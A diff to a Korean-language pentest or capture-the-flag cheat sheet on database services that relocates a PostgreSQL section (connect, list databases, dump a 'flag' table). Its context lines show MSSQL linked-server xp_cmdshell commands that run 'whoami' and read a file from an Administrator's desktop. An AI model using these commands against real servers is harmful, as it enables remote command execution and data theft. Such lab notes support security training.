@@ -1,18 +1,4 @@
 # Database Services
-## POSTGRESQL
-```bash
-psql -h localhost -p 5432 -U christine
-```
-```psql
-\l
-
-\c secrets
-
-\d
-
-select * from flag;
-```
-
 ## 🔐 SQL Injection
 
 SQL Injection은 애플리케이션의 입력값 검증 취약점을 이용하여 데이터베이스에 임의의 SQL 쿼리를 실행하는 공격 기법입니다.
@@ -390,6 +376,31 @@ EXEC ('xp_cmdshell ''whoami''') AT [LOCAL.TEST.LINKED.SRV]
 
 -- 원격 서버의 파일 읽기
 EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
+```
+---
+## POSTGRESQL(5432)
+### 기본 연결
+
+```bash
+# psql 클라이언트를 통한 연결
+# -h: 호스트, -p: 포트, -U: 사용자명
+psql -h localhost -p 5432 -U christine
+```
+
+### 기본 명령어
+
+```psql
+# 데이터베이스 목록 조회
+\l
+
+# 특정 데이터베이스 선택
+\c secrets
+
+# 테이블 목록 조회
+\d
+
+# 테이블 데이터 조회
+select * from flag;
 ```
 ---
 
